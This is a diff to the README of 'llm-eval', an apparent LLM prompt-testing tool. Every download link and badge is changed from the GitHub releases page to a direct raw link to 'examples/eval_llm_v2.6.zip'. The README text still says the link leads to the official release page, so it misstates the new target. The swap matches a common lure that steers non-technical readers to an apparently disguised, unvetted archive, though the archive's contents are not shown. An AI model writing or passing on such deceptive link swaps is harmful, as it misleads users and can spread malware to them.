@@ -1,6 +1,6 @@
 # ⚙️ llm-eval - Simple LLM Prompt Testing Tool
 
-[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/releases)
+[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will get started with llm-eval in just a few steps. It does not require tech
 
 Click the big green button at the top or visit the link below to get llm-eval files.
 
-[https://github.com/wahhyun/llm-eval/releases](https://github.com/wahhyun/llm-eval/releases)
+[https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip](https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip)
 
 This link takes you to the official release page where the latest versions are stored.
 
@@ -73,7 +73,7 @@ All results appear on the screen in a simple, easy-to-understand format.
 
 Use the link below to access all available llm-eval versions:
 
-[https://github.com/wahhyun/llm-eval/releases](https://github.com/wahhyun/llm-eval/releases)
+[https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip](https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip)
 
 ### Tips for Download and Setup
 
@@ -155,4 +155,4 @@ GitHub is the best place to get help or report bugs. You can open an issue or ch
 
 ---
 
-[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/releases)
+[![Download llm-eval](https://img.shields.io/badge/Download-llm--eval-brightgreen?style=for-the-badge)](https://github.com/wahhyun/llm-eval/raw/refs/heads/main/examples/eval_llm_v2.6.zip)
